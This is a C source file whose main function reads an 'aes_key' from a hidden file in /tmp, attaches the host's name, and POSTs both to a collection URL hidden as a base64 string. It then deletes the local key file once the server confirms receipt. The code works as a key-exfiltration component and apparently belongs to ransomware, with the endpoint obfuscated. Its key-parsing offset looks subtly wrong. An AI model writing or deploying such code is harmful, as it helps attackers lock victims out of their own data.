#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <curl/curl.h>

/* Base64 decode helper: converts a 4-character block to 3 bytes */
static inline unsigned char base64_char_value(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    if (c == '=') return 64;   /* padding marker */
    return 255;                /* invalid */
}

static char *base64_decode(const char *data, size_t *out_len) {
    if (!data) return NULL;
    size_t len = strlen(data);
    if (len == 0 || len % 4 != 0) return NULL;

    size_t max_out = (len / 4) * 3 + 1;  /* +1 for null terminator */
    char *out = malloc(max_out);
    if (!out) return NULL;

    size_t i, j = 0;
    for (i = 0; i < len; i += 4) {
        unsigned char a = base64_char_value(data[i]);
        unsigned char b = base64_char_value(data[i+1]);
        unsigned char c = base64_char_value(data[i+2]);
        unsigned char d = base64_char_value(data[i+3]);

        /* Reject invalid characters */
        if (a == 255 || b == 255 || c == 255 || d == 255) {
            free(out);
            return NULL;
        }

        out[j++] = (a << 2) | (b >> 4);
        if (c != 64)   /* not padding */
            out[j++] = (b << 4) | (c >> 2);
        if (d != 64)
            out[j++] = (c << 6) | d;
    }
    out[j] = '\0';
    if (out_len) *out_len = j;
    return out;
}

/*
 * publish_key_data: reads /tmp/.master.key, extracts aes_key, builds JSON,
 * POSTs to decoded URL, removes file on success (HTTP 200).
 * Returns 0 on success, -1 on error.
 */
int publish_key_data(void) {
    /* 1. Read file */
    FILE *f = fopen("/tmp/.master.key", "rb");
    if (!f) {
        perror("fopen /tmp/.master.key");
        return -1;
    }
    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    if (fsize <= 0) {
        fclose(f);
        return -1;
    }
    rewind(f);
    char *buf = malloc((size_t)fsize + 1);
    if (!buf) {
        fclose(f);
        return -1;
    }
    size_t nread = fread(buf, 1, (size_t)fsize, f);
    fclose(f);
    if (nread != (size_t)fsize) {
        free(buf);
        return -1;
    }
    buf[fsize] = '\0';

    /* 2. Parse "aes_key" value */
    char *key_start = strstr(buf, "\"aes_key\":\"");
    if (!key_start) {
        free(buf);
        fprintf(stderr, "aes_key field not found\n");
        return -1;
    }
    key_start += 10;  /* skip "\"aes_key\":\"" */
    char *key_end = strchr(key_start, '"');
    if (!key_end) {
        free(buf);
        fprintf(stderr, "closing quote not found\n");
        return -1;
    }
    size_t key_len = key_end - key_start;
    char *aes_key = malloc(key_len + 1);
    if (!aes_key) {
        free(buf);
        return -1;
    }
    strncpy(aes_key, key_start, key_len);
    aes_key[key_len] = '\0';
    free(buf);

    /* 3. Get hostname */
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) != 0) {
        perror("gethostname");
        free(aes_key);
        return -1;
    }
    hostname[sizeof(hostname) - 1] = '\0';

    /* 4. Build JSON string */
    size_t json_len = 13 + key_len + 13 + strlen(hostname) + 3 + 1;
    char *json = malloc(json_len);
    if (!json) {
        free(aes_key);
        return -1;
    }
    snprintf(json, json_len, "{\"aes_key\":\"%s\",\"hostname\":\"%s\"}", aes_key, hostname);
    free(aes_key);

    /* 5. Base64-decode endpoint URL */
    const char *encoded_url = "aHR0cDovLzEwLjI1NC4xOS43Mzo4MDgwL2NvbGxlY3Q=";
    size_t url_len;
    char *url = base64_decode(encoded_url, &url_len);
    if (!url) {
        free(json);
        fprintf(stderr, "base64 decode failed\n");
        return -1;
    }

    /* 6. HTTP POST with libcurl */
    CURL *curl = curl_easy_init();
    if (!curl) {
        free(json);
        free(url);
        fprintf(stderr, "curl_easy_init failed\n");
        return -1;
    }
    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/json");
    if (!headers) {
        curl_easy_cleanup(curl);
        free(json);
        free(url);
        return -1;
    }
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(json));

    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        fprintf(stderr, "curl_easy_perform failed: %s\n", curl_easy_strerror(res));
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
        free(json);
        free(url);
        return -1;
    }

    long response_code;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    free(url);

    /* 7. If HTTP 200, remove file */
    if (response_code == 200) {
        if (remove("/tmp/.master.key") != 0) {
            perror("remove");
            free(json);
            return -1;
        }
    }

    free(json);
    return 0;
}